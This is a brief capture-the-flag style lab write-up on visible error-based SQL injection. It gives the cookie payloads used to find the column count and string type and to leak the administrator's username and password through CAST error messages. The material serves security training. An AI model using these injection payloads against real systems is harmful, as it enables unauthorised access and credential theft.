# Lab: Visible error-based SQL injection

End Goal : Exploit SQL injection to retrieve the admin user's credentials from the users table and log in as admin

analysis :

SELECT trackingId From trackingIdTable where trackingId='flA4hSEBCMYQ4lQP';

Cookie: TrackingId=flA4hSEBCMYQ4lQP' -> 500 Internal Server Error -> `Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = 'flA4hSEBCMYQ4lQP''. Expected  char`

number of columns  = 1

flA4hSEBCMYQ4lQP'+order+by+2+-- -> 500 internal server error

The datatype of that single column is compatible with strings since
'+UNION+SELECT+'A'+-- -> returns 200 ok

'and+1=cast((select+username+FROM+users+limit+1+)+as+int)--; -> leaks the username -> `administrator`

'and+1=cast((select+password+FROM+users+limit+1+)+as+int)--; -> leaks the password ->`8q1v30j7af25tsduis0f`
